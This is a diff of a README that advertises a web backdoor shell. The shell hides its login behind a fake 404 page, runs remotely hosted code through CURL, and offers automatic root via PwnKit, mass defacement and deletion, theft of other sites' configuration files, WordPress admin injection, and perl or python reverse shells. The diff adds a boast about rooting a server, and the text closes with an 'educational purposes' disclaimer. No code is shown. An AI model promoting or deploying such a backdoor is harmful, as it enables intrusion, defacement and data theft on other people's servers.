@@ -13,15 +13,20 @@ Encode password using base64 and the login display looks like page 404 not found
 • Auto Update Shell
 • Auto Root (Using PwnKit)
 • Create, rename, edit, delete, download file & folder
-• Get Shell (Wso, Alfa, Marijuana)
+• Get S/T (Wso, Alfa, Marijuana, Wp Add Admin, Zone-H Notify, Csrf)
 • Command
-• Config (Retrieve config from another website on one server)
+• Config (Retrieve config from another website on this server)
 • Mass Deface (One dir & All dir)
-• Mass Delete (delete files in bulk)
+• Mass Delete (Delete files in bulk)
 • Network (For Bind port and reverse shell using perl & python)
 • Scan Root (Scan the website to get root access automatically)
 • Upload (Supports uploading multiple files at once)
 </pre>
+
+# Auto Root
+<pre align="center"><img src="https://raw.githubusercontent.com/bypass-shell/babiraga-shell/main/root.jpg" width="100%"><br>
+I tried auto root tools and g0tchaaaa! managed to root without any hassle!
+
 # Download
 <pre>Download this backdoor shell only via Official GitHub:
 
@@ -30,7 +35,7 @@ Encode password using base64 and the login display looks like page 404 not found
 <pre>The original code of this shell is stored on one server which only I know about, to run this backdoor shell
 You just need: CURL
 
-Apart from the link above, I can't guarantee it's safe from backdoor shell loggers and the like!</pre>
-</pre>
+Apart from the link above, I can't guarantee it's safe from backdoor shell loggers and the like!</pre></pre>
+
 # Legal
 <pre>This backdoor shell is only for educational purposes, if anyone uses it for illegal hacking activities and causes losses to some people, it is beyond our responsibility as the author.</pre>
